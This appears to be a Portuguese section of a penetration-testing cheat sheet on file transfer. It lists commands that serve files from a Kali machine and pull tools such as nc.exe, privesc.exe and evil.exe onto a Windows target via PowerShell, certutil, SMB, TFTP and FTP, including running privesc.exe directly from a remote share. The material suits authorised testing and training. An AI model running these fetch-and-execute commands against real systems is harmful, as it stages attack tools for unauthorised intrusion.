# 11. Transferência de Arquivos

### 11.1 Servir arquivos (kali)
```bash
python3 -m http.server 8888
php -S 0.0.0.0:8888
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port=>8888,:DocumentRoot=>Dir.pwd).start"
smbserver.py myshare /tmp/smbshare -smb2         # SMB via impacket
atftpd --daemon --port 69 /tftp                   # TFTP
```

### 11.2 Baixar no target (Windows)
```cmd
:: PowerShell:
powershell -c "(New-Object Net.WebClient).downloadFile('http://<kali>/nc.exe','C:\Users\Public\nc.exe')"
powershell wget "http://<kali>/nc.exe" -outfile nc.exe
:: certutil:
certutil.exe -urlcache -split -f "http://<kali>/file.exe" out.exe
:: SMB:
net use M: \\<kali>\myshare & copy M:\nc.exe .
\\<kali>\myshare\privesc.exe          :: executar direto do share
:: TFTP:
tftp -i <kali> GET nc.exe
:: FTP via script:
echo open <kali> 21> ftp.txt & echo user>> ftp.txt & echo pass>> ftp.txt & echo bin>> ftp.txt & echo GET evil.exe>> ftp.txt & echo bye>> ftp.txt & ftp -s:ftp.txt
:: VBScript wget.vbs para Windows antigos; SCP:  scp file user@remote:/path
```
